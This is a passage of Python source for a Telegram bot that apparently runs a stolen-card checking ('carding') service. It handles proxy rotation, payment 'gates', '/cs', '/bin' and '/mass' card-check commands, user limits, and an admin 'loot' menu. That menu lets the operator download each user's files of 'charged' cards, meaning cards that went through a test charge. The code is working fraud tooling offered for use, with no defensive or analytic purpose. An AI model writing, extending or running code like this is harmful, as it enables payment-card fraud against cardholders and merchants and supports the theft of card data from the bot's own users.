            proxy_index = int(data[1])
            proxies_data = load_proxies()
            
            if 0 <= proxy_index < len(proxies_data['proxies']):
                deleted_proxy = proxies_data['proxies'].pop(proxy_index)
                save_proxies(proxies_data)
                await query.answer(f"Deleted proxy: {deleted_proxy}")
                
                # Update the button list
                new_keyboard = []
                if proxies_data['proxies']:
                    for i, proxy in enumerate(proxies_data['proxies']):
                        new_keyboard.append([InlineKeyboardButton(f"🗑️ {proxy}", callback_data=f"delprx_{i}")])
                    reply_markup = InlineKeyboardMarkup(new_keyboard)
                    await query.edit_message_text("Deleted. Select another proxy to delete:", reply_markup=reply_markup)
                else:
                    await query.edit_message_text("Deleted the last proxy. The list is now empty.")
            else:
                await query.answer("Error: Proxy no longer exists.", show_alert=True)
        except (ValueError, IndexError) as e:
            logger.error(f"Error deleting proxy: {e}")
            await query.answer("Error processing request.", show_alert=True)
        return

    if command == "testprx":
        if user_from_callback.id != ADMIN_ID:
            await query.answer("You don't have permission.", show_alert=True); return
        
        try:
            proxy_index = int(data[1])
            proxies_data = load_proxies()
            proxy_to_test = proxies_data['proxies'][proxy_index]
            
            await query.answer(f"Testing {proxy_to_test}...")
            is_working, reason = await asyncio.to_thread(_test_proxy, proxy_to_test)
            
            result_icon = "✅" if is_working else "❌"
            await query.message.reply_text(f"**Proxy Test Result:**\n{result_icon} `{proxy_to_test}`\n**Reason:** `{reason}`")
            
        except (ValueError, IndexError) as e:
            logger.error(f"Error testing proxy: {e}")
            await query.answer("Error: Could not find proxy to test.", show_alert=True)
        return
    # --- END PROXY BUTTON HANDLING ---

    
    # --- Other buttons (Admin only) ---
    await query.answer() # Answer other queries to avoid timeout
    if user_from_callback.id != ADMIN_ID:
        await query.answer("You do not have permission to perform this action.", show_alert=True); return
        
    action = data[1]
    target_user_id = data[2] if len(data) > 2 else None

    if command == "loot":
        if action == "mainmenu":
            keyboard = [
                [InlineKeyboardButton("1. Get Latest Charged File", callback_data=f"loot_latestcharge_{target_user_id}")],
                [InlineKeyboardButton("2. Get All Charged Files", callback_data=f"loot_allcharge_{target_user_id}")],
                [InlineKeyboardButton("3. Select From History", callback_data=f"loot_history_{target_user_id}")],
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(f"Select an option to retrieve files for user `{target_user_id}`:", reply_markup=reply_markup)

        elif action == "latestcharge":
            user_log_dir = os.path.join(LOG_DIR, target_user_id)
            if not os.path.exists(user_log_dir) or not os.listdir(user_log_dir):
                await query.edit_message_text(f"No check history for user `{target_user_id}`."); return
            
            latest_session = sorted(os.listdir(user_log_dir), reverse=True)[0]
            file_path = os.path.join(user_log_dir, latest_session, "charged.txt")
            
            if os.path.exists(file_path):
                with open(file_path, 'rb') as doc: await context.bot.send_document(chat_id=query.from_user.id, document=doc)
                await query.edit_message_text(f"✅ Sent the latest charged file from session `{latest_session}`.")
            else:
                await query.edit_message_text(f"ℹ️ The latest check (`{latest_session}`) had no charged cards.")

        elif action == "allcharge":
            user_log_dir = os.path.join(LOG_DIR, target_user_id)
            all_charged_content = []
            if os.path.exists(user_log_dir):
                sessions = sorted(os.listdir(user_log_dir))
                for session_ts in sessions:
                    file_path = os.path.join(user_log_dir, session_ts, "charged.txt")
                    if os.path.exists(file_path):
                        with open(file_path, 'r', encoding='utf-8') as f: all_charged_content.append(f.read())
            
            if all_charged_content:
                combined_content = "\n".join(all_charged_content)
                with io.BytesIO(combined_content.encode('utf-8')) as file_to_send:
                    filename = f"all_charged_{target_user_id}.txt"
                    await context.bot.send_document(chat_id=query.from_user.id, document=file_to_send, filename=filename)
                await query.edit_message_text(f"✅ Sent a combined file of all charged cards for user `{target_user_id}`.")
            else:
                await query.edit_message_text(f"ℹ️ User `{target_user_id}` has no charged cards in their history.")

        elif action == "history":
            user_log_dir = os.path.join(LOG_DIR, target_user_id)
            sessions = sorted(os.listdir(user_log_dir), reverse=True)[:25]
            keyboard = []
            for session_ts in sessions:
                summary_path = os.path.join(user_log_dir, session_ts, "summary.json")
                if os.path.exists(summary_path):
                    summary = load_json_file(summary_path)
                    counts = summary.get('counts', {})
                    try: dt_obj = datetime.strptime(session_ts, "%Y%m%d-%H%M%S"); readable_ts = dt_obj.strftime("%d/%m/%Y %H:%M")
                    except ValueError: readable_ts = session_ts
                    button_text = f"🕒 {readable_ts} - ✅{counts.get('success',0)} ❌{counts.get('decline',0)}"
                    keyboard.append([InlineKeyboardButton(button_text, callback_data=f"loot_session_{target_user_id}_{session_ts}")])
            
            keyboard.append([InlineKeyboardButton("« Back to Main Menu", callback_data=f"loot_mainmenu_{target_user_id}")])
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(f"📜 **Check history for user `{target_user_id}`:**", reply_markup=reply_markup)

        elif action == "session":
            _, _, target_user_id, session_ts = data
            session_dir = os.path.join(LOG_DIR, target_user_id, session_ts)
            files = [f for f in os.listdir(session_dir) if f.endswith('.txt')] if os.path.exists(session_dir) else []
            if not files:
                await query.edit_message_text("This session has no result files."); return
            keyboard = []
            for filename in files:
                keyboard.append([InlineKeyboardButton(f"Download {filename}", callback_data=f"loot_getfile_{target_user_id}_{session_ts}_{filename}")])
            keyboard.append([InlineKeyboardButton("« Back to History", callback_data=f"loot_history_{target_user_id}")])
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(f"Select a file to download from session `{session_ts}`:", reply_markup=reply_markup)

        elif action == "getfile":
            _, _, target_user_id, session_ts, filename = data
            file_path = os.path.join(LOG_DIR, target_user_id, session_ts, filename)
            if os.path.exists(file_path):
                with open(file_path, 'rb') as doc: await context.bot.send_document(chat_id=query.from_user.id, document=doc)
                await query.answer(f"Sent file {filename}")
            else:
                await query.answer("❌ Error: File not found.", show_alert=True)

def main():
    defaults = Defaults(parse_mode=ParseMode.MARKDOWN, disable_web_page_preview=True)
    application = Application.builder().token(BOT_TOKEN).defaults(defaults).build()

    # General commands
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("info", info))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("stop", stop_command))
    
    # Admin commands
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("ban", ban_user))
    application.add_handler(CommandHandler("show", show_users))
    application.add_handler(CommandHandler("addlimit", add_limit_command))
    application.add_handler(CommandHandler("addlimitmulti", add_multi_limit_command))
    application.add_handler(CommandHandler("showcheck", show_check_command))
    application.add_handler(CommandHandler("lootfile", loot_file_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("gate", gate_command))
    application.add_handler(CommandHandler("setgate", set_gate_range_command))
    application.add_handler(CommandHandler("on", turn_bot_on))
    application.add_handler(CommandHandler("off", turn_bot_off))
    application.add_handler(CommandHandler("send", send_message_command))
    application.add_handler(CommandHandler("sendall", send_all_command))
    application.add_handler(CommandHandler("active", active_checks_command)) 

    # PROXY COMMANDS
    application.add_handler(CommandHandler("onprx", on_proxy_command))
    application.add_handler(CommandHandler("offprx", off_proxy_command))
    application.add_handler(CommandHandler("addprx", add_proxy_command))
    application.add_handler(CommandHandler("deleteprx", delete_proxy_command))
    application.add_handler(CommandHandler("testprx", test_proxy_command))
    
    # Check commands
    # Prioritize handler for admin's /cs<amount>
    application.add_handler(MessageHandler(filters.Regex(r'^/cs(\d+)'), cs_custom_amount_command))
    # Handler for regular /cs
    application.add_handler(CommandHandler("cs", cs_command))
    application.add_handler(CommandHandler("bin", bin_command))
    application.add_handler(CommandHandler("multi", multi_check_command))
    application.add_handler(MessageHandler(filters.Document.TEXT & filters.CaptionRegex(r'^/mass(\d*)'), mass_check_handler))
    
    # Site Checker commands (imported from site_checker.py)
    application.add_handler(CommandHandler("site", site_command))
    application.add_handler(CommandHandler("sitem", sitem_command))

    # Button handler
    application.add_handler(CallbackQueryHandler(button_handler))
    
    logger.info(f"Bot is running with Admin ID: {ADMIN_ID}")
    
    
    application.run_polling()

if __name__ == '__main__':
    main()
